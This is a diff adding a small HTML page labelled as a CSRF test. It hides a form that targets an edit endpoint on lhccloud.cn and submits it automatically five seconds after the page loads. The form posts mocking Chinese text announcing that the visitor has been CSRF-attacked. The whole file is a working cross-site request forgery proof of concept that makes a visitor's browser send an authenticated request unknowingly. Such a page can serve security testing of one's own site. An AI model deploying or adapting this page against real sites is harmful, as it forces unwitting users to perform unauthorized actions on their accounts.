@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CSRF测试</title>
+</head>
+<body>
+    <form action="https://lhccloud.cn/new/editIn" method="POST" id="ceshi">
+            <input class="input" type="text" name="title" value="你中计了哈哈"/>
+            <textarea class="textarea" wrap="hard" type="text" name="content" value=""/>你已经被CSRF攻击了</textarea>   
+    </form>
+
+<script type="text/javascript">
+window.onload = function(){
+    document.getElementById("ceshi").style.display = "none";
+    function csrf(){
+        document.getElementById("ceshi").submit();
+    }
+    setTimeout(csrf,5000);
+}
+</script>
+</body>
+</html>
